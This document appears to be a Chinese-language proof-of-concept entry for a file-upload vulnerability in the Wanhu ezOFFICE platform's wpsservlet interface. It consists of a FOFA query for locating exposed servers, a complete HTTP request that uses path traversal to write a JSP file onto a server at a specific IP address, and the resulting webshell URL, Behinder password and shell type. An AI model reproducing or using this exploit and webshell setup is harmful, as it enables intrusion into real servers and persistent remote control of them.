# 万户 ezOFFICE 协同办公平台 wpsservlet 接口文件上传漏洞

    ## fofa

```
title="ezOFFICE协同管理平台" || title="Wanhu ezOFFICE" || title="ezOffice for iPhone" || body="EZOFFICEUSERNAME" || body="whirRootPath" || body="/defaultroot/js/cookie.js" || header="LocLan" || (banner="/defaultroot/sp/login.jsp" && banner="Set-Cookie: JSESSIONID=") || (header="Set-Cookie: OASESSIONID=" && (title="ezOFFICE" || body="whir.util.js" || body="var ezofficeUserPortal_ = Cookie(\"ezofficeUserPortal\");"))
```

## poc

```
POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=01aCCc&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
Host: 111.59.90.19:7001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6
Referer: http://111.59.90.19:7001
Accept-Encoding: gzip
Content-Length: 759

--803e058d60f347f7b3c17fa95228eca6
Content-Disposition: form-data; name="NewFile"; filename="01aCCc.jsp"

111
--803e058d60f347f7b3c17fa95228eca6--
```

http://111.59.90.19:7001/defaultroot/platform/portal/layout/01aCCc.jsp
Password: rebeyond
WebShell tool: Behinder v3.0
Webshell type: jsp
